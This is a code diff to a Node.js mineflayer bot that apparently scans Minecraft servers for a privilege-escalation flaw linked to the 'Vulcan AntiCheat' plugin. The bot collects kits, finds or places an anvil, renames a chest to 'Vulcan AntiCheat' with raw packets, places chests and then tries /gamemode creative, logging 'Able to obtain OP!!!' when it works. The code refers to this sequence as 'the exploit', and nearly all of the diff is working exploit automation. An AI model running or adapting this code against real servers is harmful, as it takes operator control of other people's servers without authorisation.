@@ -1,4 +1,5 @@
 const mineflayer = require("mineflayer");
+const { pathfinder, Movements, goals } = require("mineflayer-pathfinder");
 const logger = require("pino")();
 const fs = require("fs");
 const randomstring = require("randomstring");
@@ -19,6 +20,52 @@ if(!fs.existsSync(LOGFILE)) {
 
 const timeoutErrorPromise = ms => new Promise((_, reject) => setTimeout(reject, ms, new Error("Timeout after " + ms + " ms")));
 const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+const name = "Vulcan AntiCheat";
+
+const useAnvil = async (bot, newBlock) => {
+    const anvil = await bot.openBlock(newBlock);
+    await sleep(201);
+    if (bot.supportFeature("useMCItemName")) {
+        bot._client.registerChannel("MC|ItemName", "string")
+    }
+    const chestsItem = bot.inventory.items().find(item => item.name === "chest");
+    const sendItemName = name => {
+        if (bot.supportFeature("useMCItemName")) {
+            bot._client.writeChannel("MC|ItemName", name);
+        } else {
+            bot._client.write("name_item", { name });
+        }
+    }
+    const addCustomName = async name => {
+        for (let i = 1; i < name.length + 1; i++) {
+            sendItemName(name.substring(0, i));
+            await sleep(50);
+        }
+    }
+    const putSomething = async (slot, itemId, metadata, count, nbt) => {
+        const options = {
+            "window": anvil,
+            "itemType": itemId,
+            metadata,
+            count,
+            nbt,
+            "sourceStart": anvil.inventoryStart,
+            "sourceEnd": anvil.inventoryEnd,
+            "destStart": slot,
+            "destEnd": slot + 1
+        };
+        await bot.transfer(options);
+    }
+    await putSomething(0, chestsItem.type, chestsItem.metadata, chestsItem.count, chestsItem.nbt);
+    sendItemName("");
+    if (!bot.supportFeature("useMCItemName")) sendItemName("");
+    await addCustomName(name);
+    await sleep(1700);
+    await bot.putAway(2);
+    await bot.currentWindow.close();
+    await sleep(510);
+}
 
 const sendInvalidPacket = async bot => {
     await bot._client.write("held_item_slot", { "slotId": -1 });
@@ -47,6 +94,7 @@ const checkServer = async server => {
         username: username
     };
     const bot = mineflayer.createBot(opts);
+    bot.loadPlugin(pathfinder);
     logger.info("Bot started!");
 
     await Promise.race([
@@ -67,6 +115,13 @@ const checkServer = async server => {
     await sleep(3000);
     logger.info("Registered and logged in!");
 
+    logger.info("Getting the starter and the bonus kits...");
+    bot.chat("/kit start");
+    await sleep(3003);
+    bot.chat("/kit bonus");
+    await sleep(3004);
+    logger.info("Got the kits!");
+
     logger.info("Trying to see what plugins we have...");
     bot.chat("/plugins");
     let plugins = "";
@@ -81,17 +136,56 @@ const checkServer = async server => {
         hasVulcan = true;
     }
 
+    let xpbottle;
+
+    await sleep(1000);
+    logger.info("Trying to find an anvil warp and use the anvil...");
+    for(let i of [
+        "enchant",
+        "anvil"
+    ]) {
+        await bot.chat("/warp " + i);
+        await sleep(3100);
+    }
+    await bot.waitForChunksToLoad();
+    logger.info("Done checking the warps, looking for the anvil now...");
+    const anvil0 = bot.findBlock({
+        "matching": block => (
+            block && block.position
+            && (
+                block.name === "anvil"
+                || block.name === "chipped_anvil"
+                || block.name === "damaged_anvil"
+            )
+        ),
+        "distance": 15,
+        "useExtraInfo": true
+    });
+    let foundAnvil = false;
+    if(anvil0) {
+        logger.info("Found an anvil!");
+        foundAnvil = true;
+        const movements = new Movements(bot);
+        bot.pathfinder.setMovements(movements);
+        bot.pathfinder.setGoal(new goals.GoalLookAtBlock(anvil0.position, bot.world));
+        await new Promise(resolve => bot.on("goal_reached", resolve));
+        xpbottle = bot.inventory.items().find(item => item.name === "experience_bottle");
+        if(xpbottle) {
+            await bot.equip(xpbottle);
+            await bot.lookAt(bot.entity.position.plus(new Vec3(0, -1, 0)));
+            await sleep(500);
+            for(let i = 0; i < 6; i++) {
+                await bot.activateItem();
+                await sleep(501);
+            }
+        }
+        await useAnvil(bot, anvil0);
+    }
+
     await sleep(3001);
     logger.info("Teleporting to a random location...");
     bot.chat("/rtp");
     await sleep(10000);
-
-    logger.info("Getting the starter and the bonus kits...");
-    bot.chat("/kit start");
-    await sleep(3003);
-    bot.chat("/kit bonus");
-    await sleep(3004);
-    logger.info("Got the kits!");
 
     logger.info("Checking the inventory for necessary items...");
     const inventory = bot.inventory.slots;
@@ -103,79 +197,44 @@ const checkServer = async server => {
     hasTwoChests = bot.inventory.items().filter(item => item.name === "chest" || item.name === "trapped_chest").reduce((all, cur) => all + cur.count, 0) >= 2;
     if(chestAmount >= 2)
         hasTwoChests = true;
-    if(hasAnvil && hasTwoChests) {
+    if((hasAnvil || foundAnvil) && hasTwoChests) {
         logger.info("We have an anvil and two chests!");
         logger.info("Trying to perform the exploit...");
         await bot.waitForChunksToLoad();
-        let block = await bot.findBlock({
-            "matching": block => (
-                block && block.position
-                && (block.position.x != Math.floor(bot.entity.position.x) || block.position.z != Math.floor(bot.entity.position.z))
-                && block.boundingBox == "block"
-            ),
-            "useExtraInfo": true,
-            "distance": 3
-        });
-        await bot.equip(bot.inventory.items().find(item => item.name === "experience_bottle"));
-        await bot.lookAt(bot.entity.position.plus(new Vec3(0, -1, 0)));
-        await sleep(500);
-        for(let i = 0; i < 6; i++) {
-            await bot.activateItem();
-            await sleep(501);
-        }
-        await bot.equip(bot.inventory.items().find(item => item.name === "anvil"
-            || item.name === "chipped_anvil"
-            || item.name === "damaged_anvil"));
-        await bot.lookAt(block.position.plus(new Vec3(0, 0.5, 0)));
-        await bot.placeBlock(block, new Vec3(0, 1, 0));
-        let newBlock = bot.blockAt(block.position.plus(new Vec3(0, 1, 0)));
-        await bot.lookAt(newBlock.position);
-        await sleep(200);
-        // const anvil = await bot.openAnvil(newBlock);
-        const anvil = await bot.openBlock(newBlock);
-        await sleep(201);
-        if (bot.supportFeature("useMCItemName")) {
-            bot._client.registerChannel("MC|ItemName", "string")
-        }
-        const chestsItem = bot.inventory.items().find(item => item.name === "chest");
-        const name = "Vulcan AntiCheat";
-        const sendItemName = name => {
-            if (bot.supportFeature("useMCItemName")) {
-                bot._client.writeChannel("MC|ItemName", name);
-            } else {
-                bot._client.write("name_item", { name });
+        if(!foundAnvil) {
+            xpbottle = bot.inventory.items().find(item => item.name === "experience_bottle");
+            if(xpbottle) {
+                await bot.equip(xpbottle);
+                await bot.lookAt(bot.entity.position.plus(new Vec3(0, -1, 0)));
+                await sleep(500);
+                for(let i = 0; i < 6; i++) {
+                    await bot.activateItem();
+                    await sleep(501);
+                }
             }
+            let block = await bot.findBlock({
+                "matching": block => (
+                    block && block.position
+                    && (block.position.x != Math.floor(bot.entity.position.x) || block.position.z != Math.floor(bot.entity.position.z))
+                    && block.boundingBox == "block"
+                ),
+                "useExtraInfo": true,
+                "distance": 3
+            });
+            await bot.equip(bot.inventory.items().find(item => item.name === "anvil"
+                || item.name === "chipped_anvil"
+                || item.name === "damaged_anvil"));
+            await bot.lookAt(block.position.plus(new Vec3(0, 0.5, 0)));
+            await bot.placeBlock(block, new Vec3(0, 1, 0));
+            let newBlock = bot.blockAt(block.position.plus(new Vec3(0, 1, 0)));
+            await bot.lookAt(newBlock.position);
+            await sleep(200);
+            // const anvil = await bot.openAnvil(newBlock);
+            await useAnvil(bot, newBlock);
+            // await anvil.shiftClick({ "mouseButton": 0, "slot": 2 })
+            // await anvil.rename(bot.inventory.items().find(item => item.name === "chest"), "Vulcan AntiCheat");
         }
-        const addCustomName = async name => {
-            for (let i = 1; i < name.length + 1; i++) {
-                sendItemName(name.substring(0, i));
-                await sleep(50);
-            }
-        }
-        const putSomething = async (slot, itemId, metadata, count, nbt) => {
-            const options = {
-                "window": anvil,
-                "itemType": itemId,
-                metadata,
-                count,
-                nbt,
-                "sourceStart": anvil.inventoryStart,
-                "sourceEnd": anvil.inventoryEnd,
-                "destStart": slot,
-                "destEnd": slot + 1
-            };
-            await bot.transfer(options);
-        }
-        await putSomething(0, chestsItem.type, chestsItem.metadata, chestsItem.count, chestsItem.nbt);
-        sendItemName("");
-        if (!bot.supportFeature("useMCItemName")) sendItemName("");
-        await addCustomName(name);
-        await sleep(1700);
-        await bot.putAway(2);
-        await bot.currentWindow.close();
-        await sleep(510);
-        // await anvil.shiftClick({ "mouseButton": 0, "slot": 2 })
-        // await anvil.rename(bot.inventory.items().find(item => item.name === "chest"), "Vulcan AntiCheat");
+        await sleep(1200);
         block = await bot.findBlock({
             "matching": block => (
                 block && block.position
@@ -188,6 +247,7 @@ const checkServer = async server => {
             "distance": 3
         });
         await bot.equip(bot.inventory.items().find(item => item.name === "chest"));
+        await sleep(209);
         await bot.lookAt(block.position.plus(new Vec3(0, 0.5, 0)));
         await sleep(1007);
         await bot.placeBlock(block, new Vec3(0, 1, 0));
@@ -249,17 +309,25 @@ const checkServer = async server => {
             });
         });
         const prom2 = new Promise(async resolve => {
+            let cont = true;
+            bot.on("end", () => { cont = false });
             try {
                 await sleep(2500);
+                if(!cont) return;
                 await bot.chat("/gamemode 1");
+                if(!cont) return;
                 await sleep(3005);
+                if(!cont) return;
                 await bot.chat("/gamemode creative");
+                if(!cont) return;
                 await sleep(508);
+                if(!cont) return;
                 if(bot.game.gameMode == "creative") {
                     logger.info("Able to obtain OP!!!");
                     certainity += 0.8;
                     canObtain = true;
                 }
+                if(!cont) return;
                 resolve();
             } catch(e) {
                 logger.warn("Non-fatal error on checking stage prom1: " + e.stack);
